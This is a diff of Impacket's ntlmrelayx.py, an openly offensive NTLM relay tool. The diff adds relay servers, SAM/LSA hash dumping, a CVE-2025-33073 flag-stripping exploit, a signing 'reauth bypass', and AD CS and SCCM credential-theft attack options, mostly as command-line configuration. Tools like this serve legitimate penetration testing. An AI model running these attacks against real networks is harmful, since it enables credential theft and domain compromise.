@@ -1,7 +1,9 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright (C) 2023 Fortra. All rights reserved.
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -14,7 +16,7 @@
 #   by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc).
 #   It receives a list of targets and for every connection received it
 #   will choose the next target and try to relay the credentials. Also, if
-#   specified, it will first to try authenticate against the client connecting
+#   specified, it will first try to authenticate against the client connecting
 #   to us.
 #
 #   It is implemented by invoking a SMB and HTTP Server, hooking to a few
@@ -32,6 +34,7 @@
 # Authors:
 #   Alberto Solino (@agsolino)
 #   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
+#  Sylvain Heiniger / Compass Security (https://www.compass-security.com)
 #
 
 import argparse
@@ -42,6 +45,7 @@ try:
     from urllib.request import ProxyHandler, build_opener, Request
 except ImportError:
     from urllib2 import ProxyHandler, build_opener, Request
+from urllib.parse import urlparse
 
 import json
 from time import sleep
@@ -49,7 +53,7 @@ from threading import Thread
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
+from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer, RPCRelayServer, WinRMRelayServer, WinRMSRelayServer, MSSQLRelayServer, RDPRelayServer 
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig, parse_listening_ports
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
 from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
@@ -79,7 +83,7 @@ class MiniShell(cmd.Cmd):
 
         # Print header
         print(outputFormat.format(*header))
-        print('  '.join(['-' * itemLen for itemLen in colLen]))
+        print('  '.join(['-' * max(itemLen, 3) for itemLen in colLen]))
 
         # And now the rows
         for row in items:
@@ -94,7 +98,7 @@ class MiniShell(cmd.Cmd):
         return
 
     def do_finished_attacks(self, line):
-        for url in self.relayConfig.target.finishedAttacks:
+        for url in self.relayConfig.target.allFinishedAttacks:
             print (url.geturl())
         return
 
@@ -108,7 +112,7 @@ class MiniShell(cmd.Cmd):
    - admin : true or false 
         '''
 
-        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
+        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port", "ID"]
         url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
         try:
             proxy_handler = ProxyHandler({})
@@ -131,7 +135,8 @@ class MiniShell(cmd.Cmd):
                     elif(_filter=='admin'):
                         _filter=3
                     else:
-                        logging.info('Expect : target / username / admin = value')                    
+                        logging.info('Expect : target / username / admin = value')
+                        return
                     _items=[]
                     for i in items:
                         if(_value.lower() in i[_filter].lower()):
@@ -148,42 +153,6 @@ class MiniShell(cmd.Cmd):
             else:
                 logging.info('No Relays Available!')
 
-    def do_admsocks(self, line):
-        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
-        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
-        try:
-            proxy_handler = ProxyHandler({})
-            opener = build_opener(proxy_handler)
-            response = Request(url)
-            r = opener.open(response)
-            result = r.read()
-            items = json.loads(result)
-
-        except Exception as e:
-            logging.error("ERROR: %s" % str(e))
-        else:
-          try:
-            if len(items) > 0:
-              new_list = [] # New dict to store the "items" JSON array
-              idx = 0
-              admonly = 'TRUE' # Search string for Admin
-              for line in items:
-                if admonly in line:
-                  new_list.insert(idx, line)
-                  idx += 1
-              if len(new_list) == 0:
-                print("\nNo Admin Sessions Available") # Do I really need to explain this?
-              else:
-                lineLen = len(new_list)
-                for i in range(lineLen):
-                  break
-              self.printTable(new_list, header=headers)
-          # Exception added to handle max() ValueError on the rowMaxLen in printTable function
-          except ValueError as e:
-            print()
-          else:
-              logging.info('No Relays Available!')
-                
     def do_startservers(self, line):
         if not self.serversRunning:
             start_servers(options, self.relayThreads)
@@ -225,8 +194,10 @@ def start_servers(options, threads):
         c.setAttacks(PROTOCOL_ATTACKS)
         c.setLootdir(options.lootdir)
         c.setOutputFile(options.output_file)
-        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record)
-        c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port)
+        c.setdumpHashes(options.dump_hashes)
+        c.setDumpLSA(options.dump_lsa)
+        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid, options.add_dns_record, options.dump_info_attr, options.dump_pre2k, delegatetarget=options.delegate_target)
+        c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port, options.icpr_ca_name)
         c.setMSSQLOptions(options.query)
         c.setInteractive(options.interactive)
         c.setIMAPOptions(options.keyword, options.mailbox, options.all, options.imap_max)
@@ -234,16 +205,29 @@ def start_servers(options, threads):
         c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
         c.setSMB2Support(options.smb2support)
         c.setSMBChallenge(options.ntlmchallenge)
+        c.setSMBRPCAttack(options.rpc_attack)
         c.setInterfaceIp(options.interface_ip)
-        c.setExploitOptions(options.remove_mic, options.remove_target)
+        c.setExploitOptions(options.remove_mic, options.remove_target, options.remove_sign_seal)
+        c.setReauthBypassOptions(options.reauth_bypass, options.reauth_bypass_hashes)
         c.setWebDAVOptions(options.serve_image)
         c.setIsADCSAttack(options.adcs)
+        c.setIsCESAttack(options.adcs_ces)
         c.setADCSOptions(options.template)
+        c.setEnumTemplates(options.enum_templates)
         c.setIsShadowCredentialsAttack(options.shadow_credentials)
         c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type,
-                                      options.cert_outfile_path)
+                          options.cert_outfile_path, options.shadow_replace,
+                          options.backup_path)
+        c.setIsSCCMPoliciesAttack(options.sccm_policies)
+        c.setIsSCCMDPAttack(options.sccm_dp)
+        c.setSCCMPoliciesOptions(options.sccm_policies_clientname, options.sccm_policies_sleep)
+        c.setSCCMDPOptions(options.sccm_dp_extensions, options.sccm_dp_files)
+        c.setIsSCCMClientPushAttack(options.sccm_clientpush) 
+        c.setSCCMClientPushOptions(options.sccm_clientpush_devicename, options.sccm_clientpush_site, options.sccm_clientpush_ip, options.sccm_clientpush_sleep)
 
         c.setAltName(options.altname)
+        c.setAltSid(options.altSid)
+        c.setHTTPS(options.https, options.certfile, options.keyfile)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
@@ -270,6 +254,14 @@ def start_servers(options, threads):
             c.setListeningPort(options.wcf_port)
         elif server is RAWRelayServer:
             c.setListeningPort(options.raw_port)
+        elif server is RPCRelayServer:
+            c.setListeningPort(options.rpc_port)
+        elif server is MSSQLRelayServer:
+            c.setListeningPort(options.mssql_port)
+            if options.mssql_db:
+                c.setMSSQLDb(options.mssql_db)
+        elif server is RDPRelayServer:
+            c.setListeningPort(options.rdp_port)
 
         s = server(c)
         s.start()
@@ -314,27 +306,36 @@ if __name__ == '__main__':
 
     # Interface address specification
     parser.add_argument('-ip','--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
-                  'bind SMB and HTTP servers',default='')
+                  'bind relay servers ("0.0.0.0" or "::" if omitted)',default=argparse.SUPPRESS)
 
     serversoptions = parser.add_argument_group()
     serversoptions.add_argument('--no-smb-server', action='store_true', help='Disables the SMB server')
     serversoptions.add_argument('--no-http-server', action='store_true', help='Disables the HTTP server')
     serversoptions.add_argument('--no-wcf-server', action='store_true', help='Disables the WCF server')
     serversoptions.add_argument('--no-raw-server', action='store_true', help='Disables the RAW server')
-
+    serversoptions.add_argument('--no-rpc-server', action='store_true', help='Disables the RPC server')
+    serversoptions.add_argument('--no-winrm-server', action='store_true', help='Disables the WinRM server')
+    serversoptions.add_argument('--no-mssql-server', action='store_true', help='Disables the MSSQL server')
+    serversoptions.add_argument('--no-rdp-server', action='store_true', help='Disables the RDP server')
+    
     parser.add_argument('--smb-port', type=int, help='Port to listen on smb server', default=445)
     parser.add_argument('--http-port', help='Port(s) to listen on HTTP server. Can specify multiple ports by separating them with `,`, and ranges with `-`. Ex: `80,8000-8010`', default="80")
     parser.add_argument('--wcf-port', type=int, help='Port to listen on wcf server', default=9389)  # ADWS
     parser.add_argument('--raw-port', type=int, help='Port to listen on raw server', default=6666)
+    parser.add_argument('--rpc-port', type=int, help='Port to listen on rpc server', default=135)
+    parser.add_argument('--mssql-port', type=int, help='Port to listen on mssql server', default=1433)
+    parser.add_argument('--rdp-port', type=int, help='Port to listen on rdp server', default=3389)
 
     parser.add_argument('--no-multirelay', action="store_true", required=False, help='If set, disable multi-host relay (SMB and HTTP servers)')
     parser.add_argument('--keep-relaying', action="store_true", required=False, help='If set, keeps relaying to a target even after a successful connection on it')
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR',default='.', help='Loot '
-                    'directory in which gathered loot such as SAM dumps will be stored (default: current directory).')
+                    'directory in which gathered loot such as SAM hashes and optional LSA secrets will be stored '
+                    '(default: current directory).')
     parser.add_argument('-of','--output-file', action='store',help='base output filename for encrypted hashes. Suffixes '
                                                                    'will be added for ntlm and ntlmv2')
+    parser.add_argument('-dh','--dump-hashes', action='store_true', default=False, help='show encrypted hashes in the console')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
                                                        'map the result with '
@@ -352,28 +353,43 @@ if __name__ == '__main__':
                                                                    'setting the proxy host to the one supplied.')
     parser.add_argument('-wa','--wpad-auth-num', action='store', type=int, default=1, help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                    'before serving a WPAD file. (default=1)')
-    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
+    parser.add_argument('-6','--ipv6', action='store_true',help='Listen on IPv6')
     parser.add_argument('--remove-mic', action='store_true',help='Remove MIC (exploit CVE-2019-1040)')
+    parser.add_argument('--remove-sign-seal', action='store_true', help='Remove SIGN/SEAL-related NTLM negotiate flags (exploit CVE-2025-33073)')
     parser.add_argument('--serve-image', action='store',help='local path of the image that will we returned to clients')
     parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on '
-                        'target system (for SMB and RPC). If not specified for SMB, hashes will be dumped (secretsdump.py must be'
-                        ' in the same directory). For RPC no output will be provided.')
+                        'target system (for SMB and RPC). If not specified for SMB, SAM hashes will be dumped; '
+                        'use --dump-lsa to also dump LSA secrets. For RPC no output will be provided.')
+    parser.add_argument('--mssql-db', action='store', required = False, help='Database for MSSQL relay')
 
     #SMB arguments
     smboptions = parser.add_argument_group("SMB client options")
 
     smboptions.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. '
-                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+                                     'If not specified, SAM hashes will be dumped; use --dump-lsa to also dump LSA secrets')
+    smboptions.add_argument('--dump-lsa', action='store_true', default=False,
+                            help='Dump LSA secrets in addition to SAM hashes')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
+    smboptions.add_argument('--rpc-attack', action='store', choices=[None, "TSCH", "ICPR"], required=False, default=None, help='Select the attack to perform over RPC over named pipes.')
+    smboptions.add_argument('--reauth-bypass', action='store', required=False, metavar='[domain/]username[:password]',
+                            help='Defeat enforced signing: open a session with this low-privilege account and relay '
+                                 'the captured authentication under its signing key. Against an SMB target this is a '
+                                 're-authentication (MS-SMB2 3.3.5.5.2); against an ldap:// target it injects one '
+                                 'write chosen with the usual LDAP attack options (--delegate-access, '
+                                 '--shadow-credentials), and a bare ":" (anonymous) often works there. Needs '
+                                 '-smb2support, and is fixed on hosts updated since September 2026')
+    smboptions.add_argument('--reauth-bypass-hashes', action='store', required=False, metavar='LMHASH:NTHASH',
+                            help='Hashes of the --reauth-bypass account, instead of its password')
     
     #RPC arguments
     rpcoptions = parser.add_argument_group("RPC client options")
-    rpcoptions.add_argument('-rpc-mode', choices=["TSCH"], default="TSCH", help='Protocol to attack, only TSCH supported')
+    rpcoptions.add_argument('-rpc-mode', choices=["TSCH", "ICPR"], default="TSCH", help='Protocol to attack')
     rpcoptions.add_argument('-rpc-use-smb', action='store_true', required=False, help='Relay DCE/RPC to SMB pipes')
     rpcoptions.add_argument('-auth-smb', action='store', required=False, default='', metavar='[domain/]username[:password]',
         help='Use this credential to authenticate to SMB (low-privilege account)')
     rpcoptions.add_argument('-hashes-smb', action='store', required=False, metavar="LMHASH:NTHASH")
     rpcoptions.add_argument('-rpc-smb-port', type=int, choices=[139, 445], default=445, help='Destination port to connect to SMB')
+    rpcoptions.add_argument('-icpr-ca-name', action='store', default="", help='Name of the CA for ICPR attack')
 
     #MSSQL arguments
     mssqloptions = parser.add_argument_group("MSSQL client options")
@@ -390,6 +406,12 @@ if __name__ == '__main__':
     httpoptions.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
     httpoptions.add_argument('-remove-target', action='store_true', default=False,
                             help='Try to remove the target in the challenge message (in case CVE-2019-1019 patch is not installed)')
+    httpoptions.add_argument('--https', action='store_true',
+                            help='Enable TLS (HTTPS) on the HTTP relay server')
+    httpoptions.add_argument('--certfile', action='store', metavar='FILE',
+                            help='Path to server certificate (PEM format) for HTTPS')
+    httpoptions.add_argument('--keyfile', action='store', metavar='FILE',
+                            help='Path to private key (PEM format) for HTTPS, if not included in the certificate file')
 
     #LDAP options
     ldapoptions = parser.add_argument_group("LDAP client options")
@@ -399,10 +421,13 @@ if __name__ == '__main__':
     ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
     ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
     ldapoptions.add_argument('--delegate-access', action='store_true', required=False, help='Delegate access on relayed computer account to the specified account')
+    ldapoptions.add_argument('--delegate-target', action='store', metavar='account|DN', required=False, help='Object to write RBCD on (sAMAccountName, or a full DN for the signing bypass), instead of the relayed computer itself')
     ldapoptions.add_argument('--sid', action='store_true', required=False, help='Use a SID to delegate access rather than an account name')
     ldapoptions.add_argument('--dump-laps', action='store_true', required=False, help='Attempt to dump any LAPS passwords readable by the user')
     ldapoptions.add_argument('--dump-gmsa', action='store_true', required=False, help='Attempt to dump any gMSA passwords readable by the user')
     ldapoptions.add_argument('--dump-adcs', action='store_true', required=False, help='Attempt to dump ADCS enrollment services and certificate templates info')
+    ldapoptions.add_argument('--dump-info-attr', action='store_true', required=False, help='Attempt to dump the info attribute of all user and group domain objects (may contain credentials)')
+    ldapoptions.add_argument('--dump-pre2k', action='store_true', required=False, help='Enumerate computer accounts vulnerable to pre-Windows 2000 authentication (predictable password)')
     ldapoptions.add_argument('--add-dns-record', nargs=2, action='store', metavar=('NAME', 'IPADDR'), required=False, help='Add the <NAME> record to DNS via LDAP pointing to <IPADDR>')
 
     #Common options for SMB and LDAP
@@ -423,8 +448,14 @@ if __name__ == '__main__':
     # AD CS options
     adcsoptions = parser.add_argument_group("AD CS attack options")
     adcsoptions.add_argument('--adcs', action='store_true', required=False, help='Enable AD CS relay attack')
-    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
+    adcsoptions.add_argument('--adcs-ces', action='store_true', default=False, help='Enable AD CS Certificate Enrollment Services (CES/WSTEP) relay attack')
+    adcsoptions.add_argument('--template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine for computer accounts and User for user accounts.')
     adcsoptions.add_argument('--altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
+    adcsoptions.add_argument('--altsid', action='store', dest='altSid', metavar="SID", required=False,
+                             help='Object SID to embed in szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2). '
+                                  'Required when StrongCertificateBindingEnforcement >= 1 (default on updated DCs since Feb 2025). '
+                                  'Obtain with: lookupsid.py DOMAIN/user:pass@DC | grep " 500$"')
+    adcsoptions.add_argument('--enum-templates', action='store_true', required=False, help='Enumerate enabled AD CS templates that the relayed account has access to')
 
     # Shadow Credentials attack options
     shadowcredentials = parser.add_argument_group("Shadow Credentials attack options")
@@ -436,6 +467,30 @@ if __name__ == '__main__':
     shadowcredentials.add_argument('--export-type', action='store', required=False, choices=["PEM", "PFX"], type=lambda choice: choice.upper(), default="PFX",
                                    help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
     shadowcredentials.add_argument('--cert-outfile-path', action='store', required=False, help='filename to store the generated self-signed PEM or PFX certificate and key')
+    shadowcredentials.add_argument('--shadow-replace', action='store_true', required=False,
+                                   help='Overwrite existing KeyCredentials with the new one instead of appending. Existing KeyCredentials are backed up to JSON first (see --backup-path)')
+    shadowcredentials.add_argument('--backup-path', action='store', required=False,
+                                   help='Path to backup JSON file used with --shadow-replace. If .json is omitted it is appended automatically')
+
+    # SCCM policies options
+    sccmpoliciesoptions = parser.add_argument_group("SCCM Policies attack options")
+    sccmpoliciesoptions.add_argument('--sccm-policies', action='store_true', required=False, help='Enable SCCM policies attack. Performs SCCM secret policies dump from a Management Point by registering a device. Works best when relaying a machine account. Expects as target \'http://<MP>/ccm_system_windowsauth/request\'')
+    sccmpoliciesoptions.add_argument('--sccm-policies-clientname', action='store', required=False, help='The name of the client that will be registered in order to dump secret policies. Defaults to the relayed account\'s name')
+    sccmpoliciesoptions.add_argument('--sccm-policies-sleep', action='store', required=False, help='The number of seconds to sleep after the client registration before requesting secret policies')
+
+    # SCCM distributions point options
+    sccmdpoptions = parser.add_argument_group("SCCM Distribution Point attack options")
+    sccmdpoptions.add_argument('--sccm-dp', action='store_true', required=False, help='Enable SCCM Distribution Point attack. Perform package file dump from an SCCM Distribution Point. Expects as target \'http://<DP>/sms_dp_smspkg$/Datalib\'')
+    sccmdpoptions.add_argument('--sccm-dp-extensions', action='store', required=False, help='A custom list of extensions to look for when downloading files from the SCCM Distribution Point. If not provided, defaults to .ps1,.bat,.xml,.txt,.pfx')
+    sccmdpoptions.add_argument('--sccm-dp-files', action='store', required=False, help='The path to a file containing a list of specific URLs to download from the Distribution Point, instead of downloading by extensions. Providing this argument will skip file indexing')
+
+    # SCCM client push options
+    sccmclientpushoptions = parser.add_argument_group("SCCM Client Push attack options")
+    sccmclientpushoptions.add_argument('--sccm-clientpush', action='store_true', required=False, help='Enable SCCM Client Push attack. Invokes SCCM client push by registering a fake device. Only works when relaying a machine account. Expects as target \'http://<MP>/ccm_system_windowsauth/request\'')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-devicename', action='store', required=False, help='The name of the fake client that will be registered in order to invoke automatic site-wide client push installation.')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-site', action='store', required=False, help='The target site to include in the SCCM Client Push DDR request.')
+    sccmclientpushoptions.add_argument('--sccm-clientpush-ip', action='store', required=False, help='The IP address the Client Push Installation should connect to.') 
+    sccmclientpushoptions.add_argument('--sccm-clientpush-sleep', action='store', default=3, type=int, required=False, help='The number of seconds to sleep after the client registration before sending the DDR request')
 
     try:
        options = parser.parse_args()
@@ -443,20 +498,80 @@ if __name__ == '__main__':
        logging.error(str(e))
        sys.exit(1)
 
+    if options.adcs_ces:
+        incompatible_modes = []
+        if options.adcs:
+            incompatible_modes.append('--adcs')
+        if options.sccm_policies:
+            incompatible_modes.append('--sccm-policies')
+        if options.sccm_dp:
+            incompatible_modes.append('--sccm-dp')
+        if incompatible_modes:
+            parser.error('--adcs-ces cannot be combined with %s' % ', '.join(incompatible_modes))
+        if options.altname or options.altSid or options.enum_templates:
+            parser.error('--altname, --altsid and --enum-templates are not supported with --adcs-ces')
+        if options.target is None and options.tf is None:
+            parser.error('--adcs-ces requires -t or -tf; reflection mode is not supported')
+        if options.target is not None and options.tf is not None:
+            parser.error('--adcs-ces accepts either -t or -tf, not both')
+        if options.socks or options.interactive or options.r is not None:
+            parser.error('--adcs-ces cannot be combined with SOCKS, interactive, or HTTP-to-SMB redirect mode')
+
+    if options.https and options.certfile is None:
+        parser.error('--https requires --certfile')
+
+    if options.reauth_bypass is None:
+        if options.reauth_bypass_hashes is not None:
+            parser.error('--reauth-bypass-hashes requires --reauth-bypass')
+    elif not options.smb2support:
+        parser.error('--reauth-bypass requires -smb2support')
+    elif options.remove_target:
+        parser.error('--reauth-bypass cannot be combined with -remove-target, which overwrites the session key')
+    elif options.target is not None and options.target.lower().startswith('ldap'):
+        # The LDAP bypass is single-shot: one write from the existing attack options, no -i / -socks
+        if options.socks or options.interactive:
+            parser.error('--reauth-bypass against an LDAP target is single-shot; -i and -socks are not supported '
+                         '(the SASL seal key becomes the victim\'s after the bind)')
+        if not (options.delegate_access or options.shadow_credentials):
+            parser.error('--reauth-bypass against an LDAP target needs one write attack: '
+                         '--delegate-access or --shadow-credentials')
+        if options.remove_mic or options.remove_sign_seal:
+            parser.error('--reauth-bypass against an LDAP target forwards the victim mechListMIC, which '
+                         '-remove-mic / -remove-sign-seal strip')
+
     if options.rpc_use_smb and not options.auth_smb:
        logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
        sys.exit(1)
+    
+    # Ensuring the correct target is set when performing SCCM policies attack
+    if options.sccm_policies is True and not options.target.rstrip('/').endswith("/ccm_system_windowsauth/request"):
+        logging.error("When performing SCCM policies attack, the Management Point authenticated device registration endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/ccm_system_windowsauth/request")
+        sys.exit(1)
+
+    # Ensuring the correct target is set when performing SCCM DP attack
+    if options.sccm_dp is True and not options.target.rstrip('/').endswith("/sms_dp_smspkg$/Datalib"):
+        logging.error("When performing SCCM DP attack, the Distribution Point Datalib endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/sms_dp_smspkg$/Datalib")
+        sys.exit(1)
+
+    # Ensuring the correct parameters are set when performing SCCM Client Push attack
+    if options.sccm_clientpush is True and not options.target.rstrip('/').endswith("/ccm_system_windowsauth/request"):
+        logging.error("When performing SCCM Client Push attack, the Management Point authenticated device registration endpoint should be provided as target")
+        logging.error(f"For instance: {urlparse(options.target).scheme}://{urlparse(options.target).netloc}/ccm_system_windowsauth/request")
+        sys.exit(1)
+    elif options.sccm_clientpush_devicename == None:
+        logging.error(f"Error please specify a name for the device to be registered.")
+        sys.exit(1)
+    elif options.sccm_clientpush_site == None:
+        logging.error(f"Error please specify a valid SCCM site.")
+        sys.exit(1)
+    elif options.sccm_clientpush_ip == None:
+        logging.error(f"Error please specify an IP address to which Client Push Installation should be invoked to.")
+        sys.exit(1)
 
     # Init the example's logger theme
-    logger.init(options.ts)
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
-        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
+    logger.init(options.ts, options.debug)
 
     # Let's register the protocol clients we have
     # ToDo: Do this better somehow
@@ -513,8 +628,21 @@ if __name__ == '__main__':
 
     if not options.no_raw_server:
         RELAY_SERVERS.append(RAWRelayServer)
+    
+    if not options.no_winrm_server:
+        RELAY_SERVERS.append(WinRMRelayServer)
+        RELAY_SERVERS.append(WinRMSRelayServer)
 
-    if targetSystem is not None and options.w:
+    if not options.no_rpc_server:
+        RELAY_SERVERS.append(RPCRelayServer)
+        
+    if not options.no_mssql_server:
+        RELAY_SERVERS.append(MSSQLRelayServer)
+
+    if not options.no_rdp_server:
+        RELAY_SERVERS.append(RDPRelayServer)
+
+    if targetSystem is not None and options.tf is not None and options.w:
         watchthread = TargetsFileWatcher(targetSystem)
         watchthread.start()
 
@@ -530,7 +658,16 @@ if __name__ == '__main__':
         socks_thread.start()
         threads.add(socks_thread)
 
+    if 'interface_ip' not in options:
+        options.interface_ip = '::' if options.ipv6 else '0.0.0.0'
+
     c = start_servers(options, threads)
+
+    # Log multirelay flag status
+    if options.no_multirelay:
+        logging.info("Multirelay disabled")
+    else:
+        logging.info("Multirelay enabled")
 
     print("")
     logging.info("Servers started, waiting for connections")
